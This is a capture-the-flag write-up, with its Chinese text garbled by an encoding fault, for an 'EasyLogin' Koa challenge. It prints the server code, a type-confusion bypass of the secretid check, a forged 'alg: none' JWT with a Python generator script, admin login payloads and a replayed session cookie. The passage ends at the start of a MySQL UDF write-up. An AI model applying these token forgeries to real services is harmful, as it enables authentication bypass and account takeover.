title="koaæ¡†æ¶:"></a>koaæ¡†æ¶:</h3><p><img src="/images/2023-2-3-EasyLogin/image-20240129155006493.png" alt="image-20240129155006493"></p><h3 id="è·å–koaçš„æ§åˆ¶å™¨controllersçš„æºç "><a href="#è·å–koaçš„æ§åˆ¶å™¨controllersçš„æºç " class="headerlink" title="è·å–koaçš„æ§åˆ¶å™¨controllersçš„æºç :"></a>è·å–koaçš„æ§åˆ¶å™¨controllersçš„æºç :</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">/controllers/api.js<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">APIError</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../rest&#x27;</span>).<span class="hljs-property">APIError</span>;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-string">&#x27;POST /api/register&#x27;</span>: <span class="hljs-title function_">async</span>(ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123; username, password &#125; = ctx.<span class="hljs-property">request</span>.<span class="hljs-property">body</span>;<br>        <span class="hljs-comment">// usernameä¸èƒ½æ˜¯adminå’Œç©º</span><br>        <span class="hljs-keyword">if</span> (!username || username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;register error&#x27;</span>, <span class="hljs-string">&#x27;wrong username&#x27;</span>);<br>        &#125;<br>        <span class="hljs-comment">// åˆ¤æ–­å…¨å±€å­˜å‚¨çš„å¯†é’¥é›†ä¸ªæ•°æ˜¯å¦è¶…è¿‡100000</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">100000</span>) &#123;<br>            <span class="hljs-comment">// å¯†é’¥é›†ä¸­çš„å¯†é’¥ä¸ªæ•°è¶…è¿‡100000å°†å¯†é’¥é›†èµ‹ç©º</span><br>            <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span> = [];<br>        &#125;<br>        <span class="hljs-comment">// éšæœºäº§ç”Ÿä¸€ä¸ªå¯†é’¥secret</span><br>        <span class="hljs-keyword">const</span> secret = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">18</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>        <span class="hljs-comment">// è·å–å½“å‰å¯†é’¥é›†ä¸­çš„å¯†é’¥ä¸ªæ•°ï¼Œä½œä¸ºå½“å‰äº§ç”Ÿçš„å¯†é’¥çš„ç´¢å¼•index</span><br>        <span class="hljs-keyword">const</span> secretid = <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span>;<br>        <span class="hljs-comment">// å°†å½“å‰ç”¨æˆ·çš„å¯†é’¥å­˜å…¥å¯†é’¥é›†ä¸­</span><br>        <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-title function_">push</span>(secret)<br>            <span class="hljs-comment">// ä½¿ç”¨username,passwordä»¥åŠå¯†é’¥è¿›è¡ŒjwtåŠ å¯†</span><br>        <span class="hljs-keyword">const</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; secretid, username, password &#125;, secret, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;);<br><br>        ctx.<span class="hljs-title function_">rest</span>(&#123;<br>            <span class="hljs-attr">token</span>: token<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;POST /api/login&#x27;</span>: <span class="hljs-title function_">async</span>(ctx, next) =&gt; &#123;<br>        <span class="hljs-comment">// è·å–è¯·æ±‚ä½“ä¸­çš„å†…å®¹ï¼Œå³è·å–loginä¸­çš„ç”¨æˆ·è¾“å…¥çš„usernameå’Œpasswordçš„å€¼</span><br>        <span class="hljs-keyword">const</span> &#123; username, password &#125; = ctx.<span class="hljs-property">request</span>.<span class="hljs-property">body</span>;<br>        <span class="hljs-comment">// åˆ¤æ–­ç”¨æˆ·çš„è¾“å…¥æ˜¯å¦ä¸ºç©º</span><br>        <span class="hljs-keyword">if</span> (!username || !password) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;username or password is necessary&#x27;</span>);<br>        &#125;<br>        <span class="hljs-comment">// è·å–ä»¤ç‰Œä¿¡æ¯</span><br>        <span class="hljs-keyword">const</span> token = ctx.<span class="hljs-property">header</span>.<span class="hljs-property">authorization</span> || ctx.<span class="hljs-property">request</span>.<span class="hljs-property">body</span>.<span class="hljs-property">authorization</span> || ctx.<span class="hljs-property">request</span>.<span class="hljs-property">query</span>.<span class="hljs-property">authorization</span>;<br><br>        <span class="hljs-keyword">const</span> sid = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(token.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_">toString</span>()).<span class="hljs-property">secretid</span>;<br>        <span class="hljs-comment">// è¾“å‡ºåœ¨ç¼–è¯‘å™¨ä¸­ï¼Œä½†ä¸è¾“å‡ºåœ¨ç½‘é¡µç«¯ä¸Š</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sid)<br><br>        <span class="hljs-keyword">if</span> (sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span> &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);<br>        &#125;<br>        <span class="hljs-comment">// è·å–å…¨å±€å˜é‡ä¸­çš„å½“å‰ç”¨æˆ·çš„secretå€¼</span><br>        <span class="hljs-keyword">const</span> secret = <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>[sid];<br>        <span class="hljs-comment">// ä½¿ç”¨token,secret,è¿›è¡Œjwtè§£å¯†ï¼Œèµ‹å€¼ç»™user,tokené€šè¿‡jwtè§£å¯†åè¿”å›åŸæ¥çš„ç”¨æˆ·ä¿¡æ¯</span><br>        <span class="hljs-comment">// å¦‚æœtokenæœ¬èº«åŠ å¯†ä¸ºalg=none,åˆ™ä¸è¿›è¡ŒHS256è§£å¯†ï¼Œç›´æ¥è¿”å›æ™®é€šè§£å¯†åçš„ç»“æœ</span><br>        <span class="hljs-keyword">const</span> user = jwt.<span class="hljs-title function_">verify</span>(token, secret, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;);<br>        <span class="hljs-comment">// è·å–userçš„ç™»å½•ä¿¡æ¯æ˜¯å¦æ­£ç¡®ï¼Œè¿”å›trueå’Œfalseç»™status</span><br>        <span class="hljs-keyword">const</span> status = username === user.<span class="hljs-property">username</span> &amp;&amp; password === user.<span class="hljs-property">password</span>;<br><br>        <span class="hljs-keyword">if</span> (status) &#123;<br>            <span class="hljs-comment">// å¯¹ctx.session.usernameçš„å€¼èµ‹å€¼</span><br>            ctx.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = username;<br>        &#125;<br><br>        ctx.<span class="hljs-title function_">rest</span>(&#123;<br>            status<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>    &#125;,<br>    <span class="hljs-comment">// ä»¥getè¯·æ±‚æ–¹å¼è®¿é—®flagæ–‡ä»¶çš„è·å–</span><br>    <span class="hljs-string">&#x27;GET /api/flag&#x27;</span>: <span class="hljs-title function_">async</span>(ctx, next) =&gt; &#123;<br>        <span class="hljs-comment">// åˆ¤æ–­sessionä¸­çš„usernameçš„å€¼æ˜¯å¦ä¸ºadmin</span><br>        <span class="hljs-keyword">if</span> (ctx.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;permission error&#x27;</span>, <span class="hljs-string">&#x27;permission denied&#x27;</span>);<br>        &#125;<br>        <span class="hljs-comment">// å¦‚æœæ˜¯adminåˆ™è¿”å›flagçš„ä¿¡æ¯</span><br>        <span class="hljs-keyword">const</span> flag = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>        ctx.<span class="hljs-title function_">rest</span>(&#123;<br>            flag<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;GET /api/logout&#x27;</span>: <span class="hljs-title function_">async</span>(ctx, next) =&gt; &#123;<br>        ctx.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = <span class="hljs-literal">null</span>;<br>        ctx.<span class="hljs-title function_">rest</span>(&#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-literal">true</span><br>        &#125;)<br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="å®¡è®¡åˆ†æ"><a href="#å®¡è®¡åˆ†æ" class="headerlink" title="å®¡è®¡åˆ†æ:"></a>å®¡è®¡åˆ†æ:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">é€šè¿‡ä»£ç å®¡è®¡ï¼Œæˆ‘ä»¬å‘ç°è¦æƒ³è·å–åˆ°flagï¼Œéœ€è¦æ»¡è¶³çš„æ¡ä»¶åªæœ‰æˆ‘ä»¬çš„username=adminå³å¯ï¼Œå³æˆ‘ä»¬åªéœ€è¦ä¼ªé€ æˆ‘ä»¬æ˜¯adminç”¨æˆ·ç™»å½•å°±å¯ä»¥è®¿é—®è·å–flag<br><br>åŒæ—¶é€šè¿‡ä»£ç å®¡è®¡èº«ä»½éªŒè¯tokenè·å–çš„authorizationæ˜¯å­˜åœ¨äºctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorizationï¼Œå³ç™»å½•æ•°æ®åŒ…ä¸­çš„heardè¯·æ±‚å¤´ï¼Œæˆ–è€…è¯·æ±‚ä½“ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠ“å–ç™»å½•çš„æ•°æ®åŒ…ï¼Œæ‰èƒ½è¿›è¡Œä¼ªé€ èº«ä»½ç™»å½•ã€‚<br></code></pre></td></tr></table></figure><h3 id="é‡æ–°æŠ“å–ç™»å½•çš„æ•°æ®åŒ…"><a href="#é‡æ–°æŠ“å–ç™»å½•çš„æ•°æ®åŒ…" class="headerlink" title="é‡æ–°æŠ“å–ç™»å½•çš„æ•°æ®åŒ…:"></a>é‡æ–°æŠ“å–ç™»å½•çš„æ•°æ®åŒ…:</h3><p><img src="/images/2023-2-3-EasyLogin/image-20240129162208872.png" alt="image-20240129162208872"></p><h4 id="è·å–åˆ°æ•°æ®"><a href="#è·å–åˆ°æ•°æ®" class="headerlink" title="è·å–åˆ°æ•°æ®:"></a>è·å–åˆ°æ•°æ®:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=south<br>&amp;password=123<br>&amp;authorization=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiJzb3V0aCIsInBhc3N3b3JkIjoiMTIzIiwiaWF0IjoxNzA2NTE2NTA1fQ.Rot2Vt8Tw4CPk5GgXzVvdIdUOsaKwpr2bNuAxDhGU38<br></code></pre></td></tr></table></figure><h3 id="å¯¹authorizationè¿›è¡Œjwtè§£å¯†-ä½¿ç”¨jwtè§£å¯†åœ¨çº¿å·¥å…·"><a href="#å¯¹authorizationè¿›è¡Œjwtè§£å¯†-ä½¿ç”¨jwtè§£å¯†åœ¨çº¿å·¥å…·" class="headerlink" title="å¯¹authorizationè¿›è¡Œjwtè§£å¯†(ä½¿ç”¨jwtè§£å¯†åœ¨çº¿å·¥å…·):"></a>å¯¹authorizationè¿›è¡Œjwtè§£å¯†(ä½¿ç”¨jwtè§£å¯†åœ¨çº¿å·¥å…·):</h3><p><a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p><p><img src="/images/2023-2-3-EasyLogin/image-20240129162531956.png" alt="image-20240129162531956"></p><p>ç”±äºæˆ‘ä»¬ä¸çŸ¥é“secretå¯†é’¥å€¼ï¼Œæ‰€ä»¥æ— æ³•ç”¨ç½‘ç«™ç›´æ¥ç”Ÿæˆæˆ‘ä»¬ä¼ªé€ çš„jwtåŠ å¯†å­—ç¬¦ä¸²</p><h3 id="secretidç»•è¿‡æ–¹å¼"><a href="#secretidç»•è¿‡æ–¹å¼" class="headerlink" title="secretidç»•è¿‡æ–¹å¼:"></a>secretidç»•è¿‡æ–¹å¼:</h3><p>ç»•è¿‡ä¸€ä¸‹ä»£ç :</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span> &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>test.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> sid = [];<br><span class="hljs-comment">// è¾“å‡ºåœ¨ç¼–è¯‘å™¨ä¸­ï¼Œä½†ä¸è¾“å‡ºåœ¨ç½‘é¡µç«¯ä¸Š</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sid)<br>    <span class="hljs-comment">// åˆ¤æ–­å¯†é’¥çš„ç´¢å¼•æ˜¯å¦åˆæ³•</span><br><span class="hljs-keyword">if</span> (sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-number">1</span> &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;nonono&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;win&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// åˆ¤æ–­å¯†é’¥çš„ç´¢å¼•æ˜¯å¦åˆæ³•</span><br><span class="hljs-keyword">if</span> (sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid == <span class="hljs-number">0</span>)) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;nonono&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;win2&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><p><img src="/images/2023-2-3-EasyLogin/image-20240129175512442.png" alt="image-20240129175512442"></p><h3 id="JWTæ”¯æŒå°†ç®—æ³•è®¾å®šä¸ºâ€œNoneâ€ã€‚å¦‚æœâ€œalgâ€å­—æ®µè®¾ä¸ºâ€œ-Noneâ€ï¼Œé‚£ä¹ˆJWTçš„ç¬¬ä¸‰éƒ¨åˆ†ä¼šè¢«ç½®ç©ºï¼Œè¿™æ ·ä»»ä½•tokenéƒ½æ˜¯æœ‰æ•ˆçš„ã€‚è¿™æ ·å°±å¯ä»¥ä¼ªé€ tokenè¿›è¡Œéšæ„è®¿é—®ï¼š"><a href="#JWTæ”¯æŒå°†ç®—æ³•è®¾å®šä¸ºâ€œNoneâ€ã€‚å¦‚æœâ€œalgâ€å­—æ®µè®¾ä¸ºâ€œ-Noneâ€ï¼Œé‚£ä¹ˆJWTçš„ç¬¬ä¸‰éƒ¨åˆ†ä¼šè¢«ç½®ç©ºï¼Œè¿™æ ·ä»»ä½•tokenéƒ½æ˜¯æœ‰æ•ˆçš„ã€‚è¿™æ ·å°±å¯ä»¥ä¼ªé€ tokenè¿›è¡Œéšæ„è®¿é—®ï¼š" class="headerlink" title="JWTæ”¯æŒå°†ç®—æ³•è®¾å®šä¸ºâ€œNoneâ€ã€‚å¦‚æœâ€œalgâ€å­—æ®µè®¾ä¸ºâ€œ Noneâ€ï¼Œé‚£ä¹ˆJWTçš„ç¬¬ä¸‰éƒ¨åˆ†ä¼šè¢«ç½®ç©ºï¼Œè¿™æ ·ä»»ä½•tokenéƒ½æ˜¯æœ‰æ•ˆçš„ã€‚è¿™æ ·å°±å¯ä»¥ä¼ªé€ tokenè¿›è¡Œéšæ„è®¿é—®ï¼š"></a>JWTæ”¯æŒå°†ç®—æ³•è®¾å®šä¸ºâ€œNoneâ€ã€‚å¦‚æœâ€œalgâ€å­—æ®µè®¾ä¸ºâ€œ Noneâ€ï¼Œé‚£ä¹ˆJWTçš„ç¬¬ä¸‰éƒ¨åˆ†ä¼šè¢«ç½®ç©ºï¼Œè¿™æ ·ä»»ä½•tokenéƒ½æ˜¯æœ‰æ•ˆçš„ã€‚è¿™æ ·å°±å¯ä»¥ä¼ªé€ tokenè¿›è¡Œéšæ„è®¿é—®ï¼š</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;<br>  &quot;alg&quot;: &quot;none&quot;,<br>  &quot;typ&quot;: &quot;JWT&quot;<br>&#125;<br><br>&#123;<br>  &quot;secretid&quot;: [],<br>  &quot;username&quot;: &quot;admin&quot;,<br>  &quot;password&quot;: &quot;123&quot;,<br>  &quot;iat&quot;: 1706516505<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬æŠŠåŠ å¯†ç®—æ³•è®¾ç½®æˆäº†â€algâ€: â€œnoneâ€,jwtçš„ç¬¬ä¸‰éƒ¨åˆ†ä¹Ÿå°±æ²¡æœ‰æ„ä¹‰äº†</p><p><strong>ç»è¿‡æµ‹è¯•å¿…é¡»é€šè¿‡â€secretidâ€: [],è¿›è¡Œç»•è¿‡ï¼Œä¸ç„¶æ‰€äº§ç”Ÿçš„jwtå¯†æ–‡å°±æ— æ³•æˆåŠŸè¢«éªŒè¯ä¸ºadmin</strong></p><h3 id="è·å–jwtåŠ å¯†çš„pythonè„šæœ¬"><a href="#è·å–jwtåŠ å¯†çš„pythonè„šæœ¬" class="headerlink" title="è·å–jwtåŠ å¯†çš„pythonè„šæœ¬:"></a>è·å–jwtåŠ å¯†çš„pythonè„šæœ¬:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> jwt<br>token = jwt.encode(<br>&#123;<br>  <span class="hljs-string">&quot;secretid&quot;</span>: [],<br>  <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1706516505</span><br>&#125;,<br>algorithm=<span class="hljs-string">&quot;none&quot;</span>,key=<span class="hljs-string">&quot;&quot;</span>).encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br> <br><span class="hljs-built_in">print</span>(token)<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><p><img src="/images/2023-2-3-EasyLogin/image-20240129172918428.png" alt="image-20240129172918428"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTcwNjUxNjUwNX0.<br></code></pre></td></tr></table></figure><h3 id="ä¸Šä¼ æˆ‘ä»¬çš„token-åŒæ—¶ä¼ªé€ èº«ä»½ä¸ºadminï¼š"><a href="#ä¸Šä¼ æˆ‘ä»¬çš„token-åŒæ—¶ä¼ªé€ èº«ä»½ä¸ºadminï¼š" class="headerlink" title="ä¸Šä¼ æˆ‘ä»¬çš„token,åŒæ—¶ä¼ªé€ èº«ä»½ä¸ºadminï¼š"></a>ä¸Šä¼ æˆ‘ä»¬çš„token,åŒæ—¶ä¼ªé€ èº«ä»½ä¸ºadminï¼š</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=admin<br>&amp;password=123<br>&amp;authorization=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTcwNjUxNjUwNX0.<br></code></pre></td></tr></table></figure><p><img src="/images/2023-2-3-EasyLogin/image-20240129173334414.png" alt="image-20240129173334414"></p><p>æˆåŠŸä¼ªé€ adminç™»å½•ï¼ï¼ï¼</p><h3 id="åœ¨å“åº”æ•°æ®åŒ…ä¸­è·å¾—adminç™»å½•cookie"><a href="#åœ¨å“åº”æ•°æ®åŒ…ä¸­è·å¾—adminç™»å½•cookie" class="headerlink" title="åœ¨å“åº”æ•°æ®åŒ…ä¸­è·å¾—adminç™»å½•cookie:"></a>åœ¨å“åº”æ•°æ®åŒ…ä¸­è·å¾—adminç™»å½•cookie:</h3><p>ç½‘é¡µéªŒè¯ä½ çš„èº«ä»½æ˜¯é€šè¿‡cookieæ¥è¿›è¡ŒéªŒè¯çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è®¿é—®api&#x2F;flagæ—¶ï¼Œä¹Ÿè¦ä¼ªé€ cookie</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">Set-Cookie: sses:aok=eyJ1c2VybmFtZSI6ImFkbWluIiwiX2V4cGlyZSI6MTcwNjYwNzMxODU2MSwiX21heEFnZSI6ODY0MDAwMDB9; path=/; expires=Tue, 30 Jan 2024 09:35:18 GMT; httponly<br>Set-Cookie: sses:aok.sig=1xDhQnp68lq8IRqsQiuMWI0LwCA; path=/; expires=Tue, 30 Jan 2024 09:35:18 GMT; httponly<br>Cache-Control: no-cache<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie=sses:aok=eyJ1c2VybmFtZSI6ImFkbWluIiwiX2V4cGlyZSI6MTcwNjYwNzMxODU2MSwiX21heEFnZSI6ODY0MDAwMDB9;sses:aok.sig=1xDhQnp68lq8IRqsQiuMWI0LwCA;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-2-3-EasyLogin/image-20240129173704271.png" alt="image-20240129173704271"></p><p>è·å¾—flagä¿¡æ¯:<br>flag&#x3D;flag{0f2c699c-e88e-4fb2-a122-19087f707cb5}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ç¬¬ä¸ƒå±Šè¥¿æ¹–è®ºå‰‘å¤ç°â€”only_sql-WP</title>
    <link href="/2024/02/03/2024-2-3-only_sql/"/>
    <url>/2024/02/03/2024-2-3-only_sql/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸ƒå±Šè¥¿æ¹–è®ºå‰‘å¤ç°â€”only-sql"><a href="#ç¬¬ä¸ƒå±Šè¥¿æ¹–è®ºå‰‘å¤ç°â€”only-sql" class="headerlink" title="ç¬¬ä¸ƒå±Šè¥¿æ¹–è®ºå‰‘å¤ç°â€”only_sql"></a>ç¬¬ä¸ƒå±Šè¥¿æ¹–è®ºå‰‘å¤ç°â€”only_sql</h1><h2 id="By-southæ•´ç†"><a href="#By-southæ•´ç†" class="headerlink" title="By-southæ•´ç†"></a>By-southæ•´ç†</h2><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ:"></a>å‚è€ƒ:</h2><p><a href="https://mp.weixin.qq.com/s/-3yim0oUpSoyp8jP_2dnwA">https://mp.weixin.qq.com/s/-3yim0oUpSoyp8jP_2dnwA</a></p><p><a href="https://zhuanlan.zhihu.com/p/675466196">linuxç¯å¢ƒä¸‹çš„MySQL UDFææƒ - çŸ¥ä¹ (zhihu.com)</a></p><p><a href="https://blog.csdn.net/q20010619/article/details/121438371">ç¬¬ä¸‰æ–¹ç»„ä»¶ææƒ-Mysql UDFææƒ_udfææƒå’Œmysqlç‰ˆæœ¬æœ‰ä»€ä¹ˆå…³ç³»-CSDNåšå®¢</a></p><h2 id="ç¯å¢ƒçš„æ­å»º"><a href="#ç¯å¢ƒçš„æ­å»º" class="headerlink" 